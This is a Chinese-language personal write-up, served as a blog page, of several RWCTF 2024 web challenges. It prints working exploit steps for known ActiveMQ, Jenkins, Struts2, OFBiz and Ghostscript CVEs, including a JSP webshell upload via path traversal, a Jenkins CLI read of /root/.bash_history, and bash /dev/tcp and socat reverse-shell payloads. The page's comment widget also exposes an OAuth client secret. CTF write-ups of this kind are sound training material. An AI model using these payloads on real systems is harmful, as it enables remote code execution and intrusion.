@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+
+    
+
+    
+
+    <title>RWCTF 2024 体验赛个人wp | 雨霖铃</title>
+    <meta name="author" content="R4iny13lueB311" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="…Be-an-ActiveMq-Hacker用的是这个exp：https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ根据文档把改好的poc-linux.xml和用msfvenom生成的test.elf部署到vps，同时监听待反弹端口，直接打Be-a-Security-Researcher先到网上下载一个jenkins-cli，poc直接打，读.bash_historyjava -jar j" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+
+    
+    <link rel="alternate" href="/atom.xml" title="雨霖铃" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/images/favicon.ico">
+    
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'icomoon';
+        src: url("/fonts/icomoon.eot?q628ml");
+        src: url("/fonts/icomoon.eot?q628ml#iefix") format('embedded-opentype'),
+             url("/fonts/icomoon.ttf?q628ml") format('truetype'),
+             url("/fonts/icomoon.woff?q628ml") format('woff'),
+             url("/fonts/icomoon.svg?q628ml#icomoon") format('svg');
+        font-weight: normal;
+        font-style: normal;
+    }
+    </style>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!--[if lt IE 9]><style type="text/css">.nav-inner {top:0;}.author-meta {position:static;top:0;}.search-form {height:36px;}</style><script type="text/javascript" src="https://unpkg.com/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+
+    <main class="app">
+        <header id="header" class="header clearfix">
+    <div id="nav" class="nav">
+    <div class="nav-mobile">
+        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
+        <h1 class="nav-mobile-title nav-mobile-item">雨霖铃</h1>
+        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
+    </div>
+
+    <nav id="nav-inner" class="nav-inner">
+        
+            <a class="nav-item" href="/">
+                <span class="nav-text">首页</span>
+            </a>
+        
+            <a class="nav-item" href="/tags/CTF">
+                <span class="nav-text">CTF</span>
+            </a>
+        
+            <a class="nav-item" href="/tags/%E6%B8%97%E9%80%8F">
+                <span class="nav-text">渗透</span>
+            </a>
+        
+            <a class="nav-item" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B">
+                <span class="nav-text">技术力</span>
+            </a>
+        
+            <a class="nav-item" href="/archives">
+                <span class="nav-text">归档</span>
+            </a>
+        
+            <a class="nav-item" href="/about">
+                <span class="nav-text">关于</span>
+            </a>
+        
+    </nav>
+</div>
+
+    <aside id="aside" class="aside">
+    <div id="aside-mask" class="aside-mask"></div>
+    <div id="aside-inner" class="aside-inner">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="https://www.ayanagi.fun"></form>
+
+        
+        
+        
+        
+
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Be-an-ActiveMq-Hacker"><span class="toc-number">1.</span> <span class="toc-text">Be-an-ActiveMq-Hacker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Be-a-Security-Researcher"><span class="toc-number">2.</span> <span class="toc-text">Be-a-Security-Researcher</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vision"><span class="toc-number">3.</span> <span class="toc-text">vision</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Be-More-Elegant"><span class="toc-number">4.</span> <span class="toc-text">Be-More-Elegant</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Be-a-Framework-Hacker"><span class="toc-number">5.</span> <span class="toc-text">Be-a-Framework-Hacker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Be-an-Interpreter-Hacker"><span class="toc-number">6.</span> <span class="toc-text">Be-an-Interpreter-Hacker</span></a></li></ol>
+        
+    </div>
+</aside>
+
+</header>
+
+        <div id="content" class="content">
+            <div id="wrapper" class="wrapper" style="max-width: 1200px">
+                <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            RWCTF 2024 体验赛个人wp
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="https://www.ayanagi.fun/2024/03/25/RW2024/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2024-03-25T05:50:59.000Z" itemprop="datePublished">2024-03-25</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag vm"></i>
+    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>…</p>
+<span id="more"></span>
+
+<h1 id="Be-an-ActiveMq-Hacker"><a href="#Be-an-ActiveMq-Hacker" class="headerlink" title="Be-an-ActiveMq-Hacker"></a>Be-an-ActiveMq-Hacker</h1><p>用的是这个exp：<code>https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</code></p>
+<p>根据文档把改好的<code>poc-linux.xml</code>和用<code>msfvenom</code>生成的<code>test.elf</code>部署到vps，同时监听待反弹端口，直接打</p>
+<p><img src="/images%5Cimage-20240127201113159.png" alt="image-20240127201113159"></p>
+<p><img src="/images%5Cimage-20240127201137078.png" alt="image-20240127201137078"></p>
+<h1 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h1><p>先到网上下载一个<code>jenkins-cli</code>，poc直接打，读<code>.bash_history</code></p>
+<p><code>java -jar jenkins-cli.jar -s http://47.96.171.129:8080/ help &quot;@/root/.bash_history&quot;</code></p>
+<p><img src="/images%5Cimage-20240127201528995.png" alt="image-20240127201528995"></p>
+<h1 id="vision"><a href="#vision" class="headerlink" title="vision"></a>vision</h1><p>首先help发现存在date命令，可以使用<code>date -f</code>读取文件</p>
+<p><code>date -f /flag</code></p>
+<p><img src="/images%5Cimage-20240127220545316.png" alt="image-20240127220545316"></p>
+<h1 id="Be-More-Elegant"><a href="#Be-More-Elegant" class="headerlink" title="Be-More-Elegant"></a>Be-More-Elegant</h1><p>看似很简单的cve，因为题目实现的action带的trick导致，全是细节。</p>
+<p>参考文章：</p>
+<p><code>https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/</code></p>
+<p>题目自己实现了一个upload action，所以要去阅读下源码，文件上传调用的是<code>be.more.elegant.HeaderIconAction</code></p>
+<p><img src="/images%5Cimage-20240128010652081.png" alt="image-20240128010652081"></p>
+<p>具体怎么跟，文章写得很清楚了。我们只需要弄明白题目上传时是如何处理文件的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">File</span> <span class="variable">UPLOAD_DIR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(HeaderIconAction.class.getClassLoader().getResource(<span class="string">&quot;../../statics/&quot;</span>).getFile(), <span class="string">&quot;uploads&quot;</span>);</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">remoteAddr</span> <span class="operator">=</span> <span class="built_in">this</span>.request.getRemoteAddr();</span><br><span class="line">      <span class="type">String</span> <span class="variable">md5ForIp</span> <span class="operator">=</span> md5Ip(remoteAddr);</span><br><span class="line">      <span class="type">File</span> <span class="variable">sandBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR, md5ForIp);</span><br><span class="line">      <span class="type">File</span> <span class="variable">fileToCreate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(sandBox, <span class="built_in">this</span>.fileUploadFileName);</span><br><span class="line">      FileUtils.copyFile(<span class="built_in">this</span>.fileUpload, fileToCreate);</span><br><span class="line">      <span class="built_in">this</span>.uploadedPath = <span class="string">&quot;statics/uploads/&quot;</span> + md5ForIp + <span class="string">&quot;/&quot;</span> + <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会强制把上传的文件放入<code>/statics/uploads/md5/filename</code>，注意后面这个<code>this.fileUploadFileName</code>将是我们覆盖的关键，y4师傅说了，这个跟action的实现写法有关，如果不看这里就永远不知道怎么传参才能成功覆盖，其他的技术角度不多说了。默认上传时的name是<code>fileUpload</code>，符合第一个属性小写第二个属性大写，会直接返回。怎么绕过呢？</p>
+<p>这又是一个细节。首先传一次正常的<code>fileUpload</code>，会得到：</p>
+<p><img src="/images/image-20240128011150979.png" alt="image-20240128011150979"></p>
+<p>此时再将<code>fileUpload</code>修改成<code>FileUpload</code>使其为第一个大写第二个也大写，降低进入map的优先级。同时打poc，用的是<code>fileUploadFileName</code>进行覆盖，同时注意题目的<code>filter</code>只允许在<code>/views/</code>下访问jsp马：</p>
+<p><img src="/images/image-20240128011348241.png" alt="image-20240128011348241"></p>
+<p>然后访问webshell地址：</p>
+<p><code>http://xxx/statics/uploads/fdc90abd7438fbbdddebced0bc64415e/../../../../views/webshell.jsp</code></p>
+<p><code>/./readflag</code></p>
+<p><img src="/images/image-20240128011434994.png" alt="image-20240128011434994"></p>
+<h1 id="Be-a-Framework-Hacker"><a href="#Be-a-Framework-Hacker" class="headerlink" title="Be-a-Framework-Hacker"></a>Be-a-Framework-Hacker</h1><p>应该是CVE-2023-49070，先按照步骤走走看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&#x27;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> |<span class="built_in">base64</span>|<span class="built_in">tr</span> -d <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后按照poc去打，果然没成功，抓包可以发现这里用的是HTTP&#x2F;2，暂时不知道和HTTP&#x2F;1.1区别是什么</p>
+<p>查了一下应该没啥大影响。首先是看</p>
+<p><code>https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20OfBiz%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-49070.md</code></p>
+<p>打CVE-2023-49070，打不动，那就应该是CVE-2023-51467。还是看y4师傅的文章：</p>
+<p><code>https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/</code></p>
+<p>继续顺藤摸瓜，可以groovy rce，绕过一个抽象的waf即可。最终打反弹shell的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groovyProgram=x%3dnew+String[3]%3bx[0]%3d&#x27;bash&#x27;%3bx[1]%3d&#x27;-c&#x27;%3bx[2]%3d&#x27;bash+-i+&gt;%2526+/dev/tcp/ip/port+0&gt;%25261%3b&#x27;%3bx.execute()%3b</span><br></pre></td></tr></table></figure>
+
+<p>getflag</p>
+<p><img src="/images/image-20240128033229405.png" alt="image-20240128033229405"></p>
+<h1 id="Be-an-Interpreter-Hacker"><a href="#Be-an-Interpreter-Hacker" class="headerlink" title="Be-an-Interpreter-Hacker"></a>Be-an-Interpreter-Hacker</h1><p>要么是CVE-2023-36664，要么是CVE-2023-28879</p>
+<p>这两个看复现演示都是需要在进入GS命令行之前选取evil.eps文件的，而靶机dockerfile初始化这一句很绝</p>
+<p><code>CMD /usr/bin/socat TCP-LISTEN:1337,fork EXEC:&#39;/usr/local/bin/gs -dSAFER&#39;</code>意思就是一连上去就会处于ghostscript命令行里面，没机会部署恶意eps</p>
+<p>继续找，找到个更新的CVE-2023-43115，青藤复现的，是-dSAFER，但是也是指定了ps文件，但没有人家手里的poc，还是不知道怎么打。期待一下wp</p>
+<p>29日更新：其实应该是28879，人家的poc演示是-dSAFER，但是应该是因为exp是根据机器环境生成的poc，所以偏移不一样。打本地的docker打不通，打本地装好的gs倒是可以打通</p>
+<p>又细读了一遍<code>https://offsec.almond.consulting/ghostscript-cve-2023-28879.html</code>，感觉是需要通过leakMemory来获取偏移，然后再生成正确的poc，最后执行命令。流下了不会pwn的泪水</p>
+<p>兜兜转转，回到CVE-2023-43115，这个poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">mark </span><br><span class="line">/OutputDevice </span><br><span class="line">/ijs </span><br><span class="line">/IjsServer </span><br><span class="line">(bash -c &#x27;echo Hello World&gt;&amp;2&#x27;) </span><br><span class="line">.dicttomark </span><br><span class="line">setpagedevice</span><br></pre></td></tr></table></figure>
+
+<p>本地能打通，连到本地起的docker反而打不通，是真的怪。</p>
+<p>经过了反反复复仔仔细细的调试，一共测试了四个通道：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.本机gs</span><br><span class="line">2.本机去nc本机起的docker gs</span><br><span class="line">3.本机进入docker shell里的gs</span><br><span class="line">4.比赛中未关闭的正式靶机</span><br></pre></td></tr></table></figure>
+
+<p>其中，1和3在执行poc的时候是有回显的，2跟4基本一样，无回显。</p>
+<p>其次，将echo改换成nc反弹shell的payload，只有1能够执行，这一点，也是为什么打不通的关键。</p>
+<p>dockerfile的初始化里有这样一句：</p>
+<p><code>CMD /usr/bin/socat TCP-LISTEN:1337</code></p>
+<p>进入dockershell后，我们可以发现：</p>
+<p><code>bash: nc: command not found</code></p>
+<p>所以最终我们要打socat的反弹shellpoc才行。</p>
+<p>vps监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:8888 -</span><br></pre></td></tr></table></figure>
+
+<p>此外赛题靶机给的challenge并不能直接拿sha1那个爆破脚本来开启给我们的端口，但也不难写，md5爆破而已</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest().startswith(s):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>最后打上payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">mark </span><br><span class="line">/OutputDevice </span><br><span class="line">/ijs </span><br><span class="line">/IjsServer </span><br><span class="line">(socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:ip:port) </span><br><span class="line">.dicttomark </span><br><span class="line">setpagedevice</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20240130105630139.png" alt="image-20240130105630139"></p>
+
+        
+    </section>
+</article>
+
+
+
+<div class="comments">
+    <div id="comments"></div>
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+    new Gitalk({
+        clientID: "8db4b4a89548994388e9",
+        clientSecret: "83900737a29fd1d7795db259d911ae2deba58908",
+        repo: "linyuqi9.github.io",
+        owner: "linyuqi9",
+        admin: ["linyuqi9"],
+        id: "811ec72ba50b7d9fcdd873becfa4c72c",
+        distractionFreeMode: true,
+        title: "RWCTF 2024 体验赛个人wp",
+        body: "https://www.ayanagi.fun/2024/03/25/RW2024/",
+        labels: ["CTF"]
+    }).render('comments');
+    </script>
+</div>
+
+
+
+            </div>
+        </div>
+
+        
+            
+            <a id="pagenext" href="/2023/12/25/MSF%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-next" title="使用MSF需要注意的点"><i class="icon-arrow-right"></i></a>
+            
+            
+            <a id="pageprev" href="/2024/03/25/%E6%B1%9F%E8%8B%8F%E7%9C%81%E7%AC%AC%E4%BA%8C%E5%B1%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%91%98%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bezchall%E5%A4%8D%E7%8E%B0/" class="article-prev" title="江苏省第二届信息安全测试员技能竞赛ezchall复现"><i class="icon-arrow-left"></i></a>
+            
+        
+
+        <footer class="footer">
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
+
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?3f0e368eb1f22fb5a593be6193301ba9";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+</footer>
+
+    </main>
+
+    <script type="text/javascript" src="https://unpkg.com/jquery@1.9.1/jquery.min.js"></script>
+    <script type="text/javascript">
+    $(function() {
+        var nodes = {
+            nav: $('#nav'),
+            aside: $('#aside'),
+            asideInner: $('#aside-inner'),
+            navInner: $('#nav-inner')
+        };
+
+        var doing = false;
+        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
+            if (nodes.aside.hasClass('mobile-open')) {
+                nodes.aside.removeClass('mobile-open');
+            } else {
+                nodes.aside.removeClass('mobile-close panel-show');
+            }
+            doing = false;
+        });
+        $('#open-panel, #aside-mask').on('click', function() {
+            if (doing) {
+                return;
+            }
+
+            if (nodes.aside.hasClass('panel-show')) {
+                nodes.aside.addClass('mobile-close');
+            } else {
+                nodes.aside.addClass('mobile-open panel-show');
+            }
+        });
+        $('#open-menus').on('click', function() {
+            nodes.navInner.slideToggle('normal', slideDone);
+        });
+
+        if (window.innerWidth <= 960) {
+            setTimeout(function() {
+                nodes.navInner.slideUp('normal', slideDone);
+            }, 3000);
+        }
+
+        function slideDone() {
+            if (nodes.navInner.css('display') !== 'none') {
+                nodes.navInner.css('display', '');
+            }
+        }
+
+        $(window).on('resize', function() {
+            if ($(this).width() > 960) {
+                nodes.navInner.css('display', '');
+            }
+        });
+    });
+    </script>
+    
+        
+<script src="/js/scrollspy.min.js"></script>
+
+        <script type="text/javascript">
+        $(document.body).scrollspy({target: '#aside-inner'});
+
+        $(window).on('resize', function() {
+            var hw = $('#header').width();
+            var ww = $('#wrapper').width();
+            var space = ($(this).width() - hw - ww) / 2 / 2;
+
+            var pageprev = $('#pageprev');
+            var pagenext = $('#pagenext');
+            var avg = (pageprev.width() + pagenext.width()) / 2
+
+            if(space > avg) {
+                var len = space - avg / 2;
+                var styles = {position: 'fixed', top: '50%', marginTop: - (pageprev.width() + pagenext.width()) / 4}
+                pageprev.css($.extend({left: hw + len}, styles));
+                pagenext.css($.extend({right: len}, styles));
+            } else {
+                pageprev.removeAttr('style');
+                pagenext.removeAttr('style');
+            }
+        }).trigger('resize');
+        </script>
+    
+
+</body>
+</html>
